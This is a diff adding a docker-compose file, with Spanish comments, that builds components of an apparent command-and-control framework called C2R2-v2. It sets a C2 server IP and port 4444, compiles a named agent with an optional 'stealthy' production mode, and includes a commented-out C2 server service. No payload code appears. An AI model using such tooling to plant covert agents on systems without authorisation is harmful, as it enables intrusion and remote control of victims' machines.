@@ -1,0 +1,39 @@
+version: '3.8'
+
+services:
+  # Servicio para compilar todos los componentes de C2R2-v2
+  builder:
+    build:
+      context: .
+      dockerfile: Dockerfile
+      args:
+        # Configuración del servidor C2 para el agente
+        SERVER_IP: ${SERVER_IP:-127.0.0.1}
+        SERVER_PORT: ${SERVER_PORT:-4444}
+        # Nombre del agente generado
+        AGENT_NAME: ${AGENT_NAME:-agent}
+        # Modo de compilación (true = producción stealthy, false = desarrollo debug)
+        PRODUCTION_MODE: ${PRODUCTION_MODE:-false}
+    image: c2r2-builder:latest
+    container_name: c2r2-builder
+    volumes:
+      # Montar directorio para obtener los binarios compilados
+      - ./dist:/output
+    environment:
+      - SERVER_IP=${SERVER_IP:-127.0.0.1}
+      - SERVER_PORT=${SERVER_PORT:-4444}
+      - AGENT_NAME=${AGENT_NAME:-agent}
+      - PRODUCTION_MODE=${PRODUCTION_MODE:-false}
+
+  # Servicio opcional: servidor C2 (descomentar para ejecutar)
+  # server:
+  #   image: c2r2-builder:latest
+  #   container_name: c2r2-server
+  #   command: /output/c2r2-server --bind 0.0.0.0 --port 4444
+  #   ports:
+  #     - "4444:4444"
+  #   volumes:
+  #     - ./dist:/output
+  #   depends_on:
+  #     - builder
+  #   restart: unless-stopped
